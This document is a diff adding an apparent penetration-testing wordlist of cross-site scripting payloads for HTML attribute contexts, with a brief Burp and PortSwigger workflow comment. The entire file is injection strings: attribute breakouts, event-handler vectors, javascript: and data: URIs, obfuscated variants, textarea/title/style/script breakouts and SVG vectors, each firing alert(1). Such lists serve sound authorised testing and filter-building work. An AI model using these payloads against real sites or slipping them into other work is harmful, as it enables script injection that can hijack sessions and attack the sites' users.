@@ -1,0 +1,48 @@
+# HTML attribute context XSS — SOTA
+# Burp workflow: inject <> then enumerate permitted tags/attributes (PortSwigger)
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+"><iframe src=javascript:alert(1)>
+"><body onload=alert(1)>
+"><input autofocus onfocus=alert(1)>
+"><details open ontoggle=alert(1)>
+"><video><source onerror=alert(1)>
+"><audio src=x onerror=alert(1)>
+"><object data=javascript:alert(1)>
+"><embed src=javascript:alert(1)>
+"><marquee onstart=alert(1)>
+"><isindex action=javascript:alert(1) type=submit>
+"><form action=javascript:alert(1)><input type=submit>
+"><button formaction=javascript:alert(1)>
+"><a href=javascript:alert(1)>click
+"><math href=javascript:alert(1)>
+
+" onmouseover="alert(1)
+" onfocus="alert(1)" autofocus="
+" onerror="alert(1)" src=x
+" accesskey="x" onclick="alert(1)"
+' onmouseover='alert(1)
+' onfocus='alert(1)' autofocus='
+
+javascript:alert(1)
+javascript:alert&lpar;1&rpar;
+JaVaScRiPt:alert(1)
+data:text/html,<script>alert(1)</script>
+
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+"><img src=x id=alert(1) onerror=eval(id)>
+
+# Breakout from textarea/title/style/script
+</textarea><script>alert(1)</script>
+</title><script>alert(1)</script>
+</style><script>alert(1)</script>
+</script><script>alert(1)</script>
+--></script><script>alert(1)</script>
+
+# SVG attribute vectors
+"><svg><animate onbegin=alert(1) attributeName=x dur=1s>
+"><svg><set onbegin=alert(1) attributeName=x dur=1s>
+"><svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler>
